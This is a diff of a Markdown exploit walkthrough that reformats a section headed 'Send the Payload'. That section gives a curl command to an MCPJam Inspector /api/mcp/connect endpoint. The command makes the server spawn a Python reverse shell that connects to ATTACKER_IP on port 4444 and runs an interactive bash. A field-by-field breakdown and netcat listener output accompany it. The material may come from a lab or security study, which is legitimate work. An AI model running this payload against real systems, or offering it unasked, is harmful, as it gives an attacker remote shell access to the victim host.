@@ -768,13 +768,19 @@ listening on [any] 4444 ...
 ```
 <div align="center">
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
 <br>
 </div>
 
-#### 
-**Command:** `curl -s -X POST http://TARGET_IP:6274/api/mcp/connect -H "Content-Type: application/json" -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],"serverId":"revshell"}}'`
+#### 3.2.2 Send the Payload
+
+**Command:**
+
+`curl -s -X POST http://TARGET_IP:6274/api/mcp/connect -H "Content-Type: application/json" -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],"serverId":"revshell"}}'`
 
 **Breakdown:**
+
 - `"type":"stdio"` — Tells MCPJam Inspector to use the stdio transport, which spawns a subprocess.
 - `"command":"python3"` — The interpreter to execute; python3 is available on most Ubuntu systems.
 - `"args":["-c","..."]` — The `-c` flag passes the Python one-liner as inline code. The shell command embedded connects back to the attacker's IP on port 4444 and redirects stdin/stdout/stderr over the socket.
